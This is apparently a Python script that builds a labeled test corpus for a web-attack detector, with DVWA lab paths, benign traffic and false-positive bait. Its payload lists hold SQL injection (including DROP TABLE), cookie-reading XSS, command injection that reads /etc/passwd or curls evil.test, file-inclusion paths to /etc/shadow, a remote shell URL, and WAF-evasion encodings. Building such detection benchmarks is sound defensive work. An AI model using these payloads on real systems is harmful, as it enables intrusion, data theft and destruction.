"""Build the labeled attack corpus from PUBLIC payload sources (anti-bias).

Payloads are taken from well-known public references — PortSwigger Web Security
Academy, OWASP, and PayloadsAllTheThings — NOT hand-crafted to favor the agent.
Each entry records its `source`. Run: python build_corpus.py  ->  corpus.jsonl
"""

import json
import os
import secrets

OUT = os.path.join(os.path.dirname(__file__), "corpus.jsonl")

# (attack_type, mitre, path, param, payload, source)
CLEAR_ATTACK = [
    # SQL injection — classic, public
    ("sqli", "T1190", "/dvwa/vulnerabilities/sqli/", "id", "1' OR '1'='1", "PortSwigger SQLi"),
    ("sqli", "T1190", "/dvwa/vulnerabilities/sqli/", "id", "1' OR 1=1-- -", "PayloadsAllTheThings SQLi"),
    ("sqli", "T1190", "/dvwa/vulnerabilities/sqli/", "id", "1' UNION SELECT user,password FROM users-- -", "PortSwigger SQLi UNION"),
    ("sqli", "T1190", "/dvwa/vulnerabilities/sqli/", "id", "1'; DROP TABLE users-- -", "OWASP SQLi"),
    ("sqli", "T1190", "/dvwa/vulnerabilities/sqli/", "id", "1' AND SLEEP(5)-- -", "PayloadsAllTheThings blind SQLi"),
    # XSS — reflected, public
    ("xss", "T1059.007", "/dvwa/vulnerabilities/xss_r/", "name", "<script>alert(1)</script>", "OWASP XSS"),
    ("xss", "T1059.007", "/dvwa/vulnerabilities/xss_r/", "name", "<img src=x onerror=alert(1)>", "PortSwigger XSS"),
    ("xss", "T1059.007", "/dvwa/vulnerabilities/xss_r/", "name", "<svg/onload=alert(document.cookie)>", "PayloadsAllTheThings XSS"),
    ("xss", "T1059.007", "/dvwa/vulnerabilities/xss_r/", "name", "javascript:alert(1)", "OWASP XSS"),
    # Command injection
    ("cmdi", "T1059", "/dvwa/vulnerabilities/exec/", "ip", "127.0.0.1; cat /etc/passwd", "PayloadsAllTheThings CMDi"),
    ("cmdi", "T1059", "/dvwa/vulnerabilities/exec/", "ip", "127.0.0.1 && whoami", "OWASP CMDi"),
    ("cmdi", "T1059", "/dvwa/vulnerabilities/exec/", "ip", "127.0.0.1 | id", "PayloadsAllTheThings CMDi"),
    ("cmdi", "T1059", "/dvwa/vulnerabilities/exec/", "ip", "$(curl http://evil.test)", "PortSwigger CMDi"),
    # LFI / path traversal
    ("lfi", "T1083", "/dvwa/vulnerabilities/fi/", "page", "../../../../../../etc/passwd", "OWASP Path Traversal"),
    ("lfi", "T1083", "/dvwa/vulnerabilities/fi/", "page", "/etc/passwd", "PayloadsAllTheThings LFI"),
    ("lfi", "T1083", "/dvwa/vulnerabilities/fi/", "page", "../../../../etc/shadow", "PayloadsAllTheThings LFI"),
    ("rfi", "T1190", "/dvwa/vulnerabilities/fi/", "page", "http://evil.test/shell.txt", "OWASP RFI"),
]

# Obfuscated / evasion variants of the SAME attack classes (public techniques)
EVASION = [
    ("sqli", "T1190", "/dvwa/vulnerabilities/sqli/", "id", "1'/**/OR/**/1=1-- -", "PayloadsAllTheThings WAF bypass"),
    ("sqli", "T1190", "/dvwa/vulnerabilities/sqli/", "id", "1' /*!50000UNION*/ /*!50000SELECT*/ 1,2-- -", "PayloadsAllTheThings MySQL inline comment"),
    ("sqli", "T1190", "/dvwa/vulnerabilities/sqli/", "id", "1' UnIoN SeLeCt 1,2-- -", "PayloadsAllTheThings case mix"),
    ("sqli", "T1190", "/dvwa/vulnerabilities/sqli/", "id", "1%27%20OR%201%3D1--%20-", "URL-encoded SQLi (OWASP)"),
    ("sqli", "T1190", "/dvwa/vulnerabilities/sqli/", "id", "1%2527%2520OR%25201%253D1", "Double-URL-encoded SQLi (PayloadsAllTheThings)"),
    ("sqli", "T1190", "/dvwa/vulnerabilities/sqli/", "id", "1' OR 0x31=0x31-- -", "Hex-encoded SQLi (PayloadsAllTheThings)"),
    ("sqli", "T1190", "/dvwa/vulnerabilities/sqli/", "id", "1' OR CHAR(49)=CHAR(49)-- -", "CHAR() obfuscation (PayloadsAllTheThings)"),
    ("xss", "T1059.007", "/dvwa/vulnerabilities/xss_r/", "name", "<scr<script>ipt>alert(1)</scr</script>ipt>", "OWASP nested-tag bypass"),
    ("xss", "T1059.007", "/dvwa/vulnerabilities/xss_r/", "name", "%3Cscript%3Ealert(1)%3C/script%3E", "URL-encoded XSS (OWASP)"),
    ("xss", "T1059.007", "/dvwa/vulnerabilities/xss_r/", "name", "<IMG SRC=x ONERROR=alert(1)>", "Case-mixed XSS (PayloadsAllTheThings)"),
    ("xss", "T1059.007", "/dvwa/vulnerabilities/xss_r/", "name", "<svg><script>&#97;lert(1)</script>", "HTML-entity XSS (PortSwigger)"),
    ("cmdi", "T1059", "/dvwa/vulnerabilities/exec/", "ip", "127.0.0.1;cat${IFS}/etc/passwd", "PayloadsAllTheThings IFS bypass"),
    ("cmdi", "T1059", "/dvwa/vulnerabilities/exec/", "ip", "127.0.0.1%0acat%20/etc/passwd", "Newline-injection CMDi (PayloadsAllTheThings)"),
    ("cmdi", "T1059", "/dvwa/vulnerabilities/exec/", "ip", "127.0.0.1;c\\at /et\\c/pa\\sswd", "Backslash-evasion CMDi (PayloadsAllTheThings)"),
    ("lfi", "T1083", "/dvwa/vulnerabilities/fi/", "page", "..%2f..%2f..%2f..%2fetc%2fpasswd", "URL-encoded traversal (OWASP)"),
    ("lfi", "T1083", "/dvwa/vulnerabilities/fi/", "page", "....//....//....//etc/passwd", "Nested traversal bypass (PayloadsAllTheThings)"),
    ("lfi", "T1083", "/dvwa/vulnerabilities/fi/", "page", "%252e%252e%252fetc%252fpasswd", "Double-encoded traversal (PayloadsAllTheThings)"),
    ("lfi", "T1083", "/dvwa/vulnerabilities/fi/", "page", "php://filter/convert.base64-encode/resource=index", "PHP wrapper LFI (PayloadsAllTheThings)"),
]

# Benign requests that LOOK malicious (false-positive bait) — label benign
FP_BAIT = [
    ("/dvwa/vulnerabilities/sqli/", {"id": "What is a UNION SELECT statement in SQL?"}, "blog-style query w/ SQL keywords"),
    ("/dvwa/vulnerabilities/sqli/", {"id": "How to prevent ' OR 1=1 injection"}, "security article query"),
    ("/search", {"q": "best practices to stop XSS <script> attacks"}, "search about XSS"),
    ("/search", {"q": "tutorial: command injection ; cat examples"}, "educational search"),
    ("/blog/post", {"title": "Understanding ../../ path traversal defense"}, "blog title w/ traversal text"),
    ("/feedback", {"comment": "I really like using <b>bold</b> and lists in HTML"}, "benign HTML in comment"),
    ("/dvwa/vulnerabilities/fi/", {"page": "passwd_reset_help"}, "filename contains 'passwd' substring"),
    ("/products", {"category": "union-jack-flags"}, "word 'union' in benign context"),
    ("/api/notes", {"text": "select all items and drop them in cart"}, "SQL-like words, benign sentence"),
]

# Normal traffic — label benign
BENIGN_NORMAL = [
    ("/dvwa/login.php", {}, "login page"),
    ("/dvwa/index.php", {}, "home page"),
    ("/dvwa/vulnerabilities/sqli/", {"id": "1"}, "legitimate id lookup"),
    ("/dvwa/vulnerabilities/xss_r/", {"name": "Alice"}, "normal name input"),
    ("/dvwa/vulnerabilities/exec/", {"ip": "8.8.8.8"}, "legitimate ping"),
    ("/dvwa/vulnerabilities/fi/", {"page": "include.php"}, "normal page include"),
    ("/products", {"category": "books"}, "product browse"),
    ("/search", {"q": "wireless headphones"}, "normal search"),
    ("/api/notes", {"text": "remember to buy milk"}, "normal note"),
    ("/profile", {"user": "bob"}, "view profile"),
]


def _eid() -> str:
    return secrets.token_hex(4)


def _ua(group: str) -> str:
    # one scanner UA in fp_bait to test UA-based FP; rest normal
    if group == "scanner_ua":
        return "sqlmap/1.7"
    return "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"


def build() -> list[dict]:
    rows: list[dict] = []

    for atk, mitre, path, param, payload, src in CLEAR_ATTACK:
        rows.append(dict(eid=_eid(), group="clear_attack", label="malicious",
                         attack_type=atk, mitre=mitre, method="GET", path=path,
                         params={param: payload}, user_agent=_ua("normal"), source=src))

    for atk, mitre, path, param, payload, src in EVASION:
        rows.append(dict(eid=_eid(), group="evasion", label="malicious",
                         attack_type=atk, mitre=mitre, method="GET", path=path,
                         params={param: payload}, user_agent=_ua("normal"), source=src))

    for path, params, src in FP_BAIT:
        rows.append(dict(eid=_eid(), group="fp_bait", label="benign",
                         attack_type="none", mitre="", method="GET", path=path,
                         params=params, user_agent=_ua("normal"), source=src))

    # one fp_bait entry with scanner User-Agent but benign path
    rows.append(dict(eid=_eid(), group="fp_bait", label="benign", attack_type="none",
                     mitre="", method="GET", path="/dvwa/index.php", params={},
                     user_agent="sqlmap/1.7", source="scanner UA, benign path"))

    for path, params, src in BENIGN_NORMAL:
        rows.append(dict(eid=_eid(), group="benign_normal", label="benign",
                         attack_type="none", mitre="", method="GET", path=path,
                         params=params, user_agent=_ua("normal"), source=src))

    return rows


if __name__ == "__main__":
    rows = build()
    with open(OUT, "w", encoding="utf-8") as f:
        for r in rows:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")
    counts: dict[str, int] = {}
    for r in rows:
        counts[r["group"]] = counts.get(r["group"], 0) + 1
    print(f"Wrote {len(rows)} entries to {OUT}")
    print("By group:", json.dumps(counts, indent=2))
    print("NOTE: This is a SEED corpus (~60). Scale up per group from the same "
          "public sources before final EC2 runs (target ~150, see ROADMAP).")
